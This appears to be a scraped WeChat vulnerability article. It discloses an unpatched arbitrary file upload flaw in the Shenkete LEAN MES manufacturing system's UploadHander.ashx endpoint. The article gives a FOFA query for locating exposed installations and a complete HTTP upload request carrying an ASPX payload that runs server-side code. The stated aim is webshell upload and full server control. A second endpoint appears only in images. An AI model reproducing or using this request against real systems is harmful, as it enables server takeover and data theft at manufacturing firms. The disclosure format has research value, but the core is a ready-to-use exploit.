---
title: 【0day】深科特 LEAN MES系统 UploadHander.ashx 文件上传漏洞
url: https://mp.weixin.qq.com/s/B13sKATcVtr_Zx1o0OTM0Q
source: Doonsec's feed
date: 2026-03-29
fetch_date: 2026-03-30T04:39:43.709334
---

# 【0day】深科特 LEAN MES系统 UploadHander.ashx 文件上传漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZrTsB3aQgWDHbqdJqZ8SJT4rtteEy1VqzMZ7ib21fRpwetPAMPNRK2cicwZmjmeRCibE2qic35rQ3sbbqouxwlVGs7EajibRXWXueITlDSK0DvAo/0?wx_fmt=jpeg)

# 【0day】深科特 LEAN MES系统 UploadHander.ashx 文件上传漏洞

0day收割机

![]()

在小说阅读器中沉浸阅读

# 漏洞简介

LEAN MES系统是由深圳市深科特信息技术有限公司开发的一款应用系统，主要用于生产调度、产品跟踪、质量控制等车间管理功能。LEAN MES精益制造执行系统通过强调制造过程的信息化和透明化，帮助企业由粗放式向精益化管理模式升级。该系统/Handler/UploadHander.ashx存在任意文件上传漏洞。攻击者可通过构造恶意请求，绕过文件类型或内容校验，上传恶意文件（如WebShell），实现任意命令执行，获取服务器控制权限，导致敏感数据泄露或系统被进一步攻击。

# 影响版本

# fofa语法

> (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant\_top.png"

# 漏洞复现

## ImportResultData-文件上传

```
POST /Handler/UploadHander.ashx?Action=ImportResultData HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="Filedata"; filename="1.aspx."

<%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
------WebKitFormBoundary--
```

访问`/UploadFiles/TemporaryFile/1.aspx`文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWDW9qibMv33f0iaZrYKoBXLoUSSmvDviafQpeAr3IRl8qHTquJJ0Zs0eubnia5aX9dcg0s8MAsbLjfbAFdoiaxqibemIeiaE5gtQtBmM4/640?wx_fmt=png&from=appmsg)

成功执行代码，并删除自身。

## MouldAnormal/FileUploadEquiment-文件上传

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBkgPhMLKamf6GahIictcXK0o99tUiaIq7IZQcPu5L8JcR3zwX4rCHicepicdzcLQiaeuhb0UAicW8QricREAM2nicSib0nrHaUlSfqTjok/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBwoYMIqxL53hlht4ChHdcRcI8ibGBgBFJMCia8oU0TODqicjGoEVV8enDIuHcEuFl2w0dtE6NRnrMjQ1wpQ650pevxRqnM2CLs6Y/640?wx_fmt=png&from=appmsg)

仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

0day收割机

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过